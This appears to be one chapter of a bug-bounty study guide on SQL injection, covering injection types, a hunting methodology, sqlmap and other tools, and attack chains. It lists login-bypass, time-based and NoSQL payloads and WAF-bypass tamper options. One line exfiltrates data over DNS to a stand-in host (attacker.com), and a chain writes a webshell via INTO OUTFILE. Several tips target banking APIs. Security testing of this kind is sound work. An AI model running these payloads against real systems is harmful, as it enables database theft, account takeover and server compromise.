# 01 — SQL Injection (SQLi)

**CWE-89** | **CVSS: 9.8 Critical** | **OWASP A03:2021**

---

## What Is It?

SQLi occurs when user-supplied input is inserted into SQL queries without proper sanitisation, allowing attackers to manipulate database logic, exfiltrate data, bypass auth, and achieve RCE.

> **Core Problem:** App builds SQL query with raw user input. Attacker controls query logic.

---

## Vulnerability Types

| Type | Description |
|------|-------------|
| **In-Band SQLi (Classic)** | Results returned directly. Error-based: DB errors reveal structure. Union-based: append extra SELECT. |
| **Blind Boolean-Based** | No output — infer via TRUE/FALSE responses. Slow but reliable. |
| **Blind Time-Based** | Use `SLEEP()`/`WAITFOR DELAY` to infer data via response timing. |
| **Out-of-Band (OOB)** | Exfil via DNS/HTTP callbacks. Useful when in-band and blind fail. |
| **Second-Order SQLi** | Input stored then used unsanitized in a later query. |
| **NoSQL Injection** | MongoDB: `{'$gt':''}`, `{'$where':'sleep(5000)'}`. Different syntax, same impact. |

---

## Hunting Methodology

1. Map all input points: GET/POST params, headers (`User-Agent`, `Referer`, `X-Forwarded-For`), cookies, JSON/XML bodies.
2. Test error-based: add single quote `'` — watch for DB errors (MySQL/MSSQL/Oracle/PostgreSQL).
3. Test boolean-based: `AND 1=1` (true) vs `AND 1=2` (false) — compare response sizes.
4. Test time-based: `' AND SLEEP(5)--` on MySQL; `'; WAITFOR DELAY '0:0:5'--` on MSSQL.
5. Use `ORDER BY N` to find column count. Then `UNION SELECT NULL,NULL,...`
6. Enumerate: DB version, current user, database names, table names, column names, data.
7. Try stacked queries (`;`), comment styles (`--`, `#`, `/**/`), and WAF bypass encodings.
8. Check second-order: store payload in profile/name, trigger in another feature.
9. For NoSQL: test JSON operators `$gt`, `$ne`, `$where`, `$regex` in JSON body params.
10. Banking: test transaction IDs, account numbers, statement filters for SQLi.

---

## Essential Tools

| Tool | Purpose |
|------|---------|
| **sqlmap** | Auto-exploitation. Use `--level=5 --risk=3 --tamper=space2comment` for WAF bypass. |
| **Burp Suite** | Manual payload injection via Repeater. Intruder for fuzzing. |
| **ghauri** | Modern sqlmap alternative — faster, better WAF bypass. |
| **NoSQLMap** | NoSQL injection automation for MongoDB, CouchDB. |
| **SQLNinja** | MSSQL exploitation to OS shell. |

---

## Tips & Tricks

- **#1** Always test HTTP headers — `X-Forwarded-For`, `User-Agent`, `Referer` often go directly into logs/DB.
- **#2** If WAF blocks you: use `--tamper=between,randomcase,space2comment` in sqlmap.
- **#3** Time-based blind in banking APIs: transaction date filters, account search — often unsanitized.
- **#4** Second-order gold mine: registration username → admin panel renders it in unsanitized query.
- **#5** OOB via DNS: `' UNION SELECT load_file(concat('\\',version(),'.attacker.com\x'))--`
- **#6** Login bypass classic: `' OR '1'='1'--` (test all auth forms, including mobile app login API).
- **#7** NoSQL in mobile apps: Intercept JSON body and replace string values with `{'$gt':''}`.

---

## Deadly Chains

```
SQLi + File Write → RCE
  └─ SQLi into OUTFILE '/var/www/shell.php' → execute webshell

SQLi + Auth Bypass → Admin ATO
  └─ Extract admin hash → crack or bypass login

SQLi + IDOR
  └─ Extract user IDs from DB → use in IDOR attacks on other endpoints

SQLi + Stored XSS
  └─ Inject XSS payload into DB via SQLi → triggers for all viewers

Time-based SQLi + Banking
  └─ Enumerate account balances, transaction history silently
```
